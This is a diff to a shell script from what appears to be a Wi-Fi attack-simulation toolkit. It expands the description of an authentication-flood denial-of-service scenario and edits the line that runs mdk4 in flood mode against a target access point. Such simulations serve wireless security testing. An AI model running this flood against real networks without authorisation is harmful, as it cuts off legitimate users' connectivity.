@@ -23,7 +23,7 @@ print_none "Tool:          $SCN_TOOL"
 print_none "Mode:          $SCN_MODE"
 print_blank
 print_wrapped_indent "Objective: " \
-"This scenario simulates a denial of service condition by sending a rapid stream of fake authentication requests to a target access point.  This can overload the AP's association table or CPU resources, disrupting service for legitimate clients."
+"This scenario simulates an Authentication Flood, a denial-of-service attack. The script uses mdk4 to send a rapid stream of spoofed authentication requests to a target access point. Each request appears to come from a unique, randomised client MAC address. This can overload the AP's association table or CPU resources, disrupting service for legitimate clients."
 print_line
 
 confirmation
@@ -62,7 +62,7 @@ print_section "Simulation"
 ensure_monitor_mode
 print_blank
 print_waiting "Running"
-sudo timeout "$SCN_DURATION" mdk4 "$INTERFACE" a -a "$SCN_BSSID" -s "$SCN_AUTH_PPS"
+timeout "$SCN_DURATION" mdk4 "$INTERFACE" a -a "$SCN_BSSID" -s "$SCN_AUTH_PPS"
 EXIT_CODE=$?
 ensure_managed_mode
 
